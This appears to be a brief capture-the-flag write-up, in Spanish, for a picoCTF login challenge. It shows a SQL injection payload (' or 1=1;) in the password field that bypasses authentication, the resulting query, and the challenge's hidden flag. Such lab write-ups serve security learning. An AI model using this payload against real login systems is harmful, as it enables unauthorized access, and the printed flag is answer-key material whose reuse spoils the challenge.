## Objetivo 
Can you login to this website?

Additional details will be available after launching your challenge instance.


## Solución  
metemos una inyeccion SQL al inicio de sesión, inspeccionamos la pagina, y marca una etiqueta oculta
Seleccionaremos esa etiqueta y nos muestra la bandera



![[Pasted image 20241026231548.png]]

username: admin
password: &#039; or 1=1;
SQL query: SELECT * FROM users WHERE name=&#039;admin&#039; AND password=&#039;&#039; or 1=1;&#039;
</pre><h1>Logged in! But can you see the flag, it is in plainsight.</h1><p hidden>Your flag is: picoCTF{L00k5_l1k3_y0u_solv3d_it_d3c660ac}


